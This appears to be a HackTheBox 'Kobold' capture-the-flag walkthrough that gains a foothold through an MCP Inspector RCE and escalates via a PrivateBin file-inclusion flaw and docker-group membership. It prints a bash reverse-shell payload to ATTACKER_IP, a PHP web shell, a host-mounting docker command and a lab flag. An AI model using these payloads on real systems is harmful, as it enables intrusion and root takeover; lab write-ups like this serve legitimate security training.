# HackTheBox - Kobold Walkthrough

## Enumeration

Open ports:

    22 SSH
    80 HTTP
    443 HTTPS
    3552 Arcane

Subdomain discovery:

``` bash
ffuf -H "Host: FUZZ.kobold.htb"
```

Found:

    mcp.kobold.htb
    bin.kobold.htb

------------------------------------------------------------------------

# Initial Access

MCPJam Inspector was vulnerable to RCE.

Payload:

``` json
{
 "serverConfig":{
  "command":"/bin/bash",
  "args":["-c","sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1"]
 }
}
```

Shell obtained:

    ben

User flag:

    91cd4e73ccc28e0b95f922f67331ce7b

------------------------------------------------------------------------

# Privilege Escalation

PrivateBin version:

    2.0.2

was vulnerable to local file inclusion.

A PHP payload was written:

``` php
<?php system($_GET["cmd"]); ?>
```

Triggered:

``` bash
curl "https://bin.kobold.htb/?cmd=id"
```

------------------------------------------------------------------------

# Docker Privilege Escalation

User belonged to docker group.

Check:

``` bash
id
```

Docker abuse:

``` bash
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

------------------------------------------------------------------------

# Root Flag

------------------------------------------------------------------------

# Lessons Learned

-   Secure MCP endpoints.
-   Patch exposed applications.
-   Docker group membership equals root-level access.
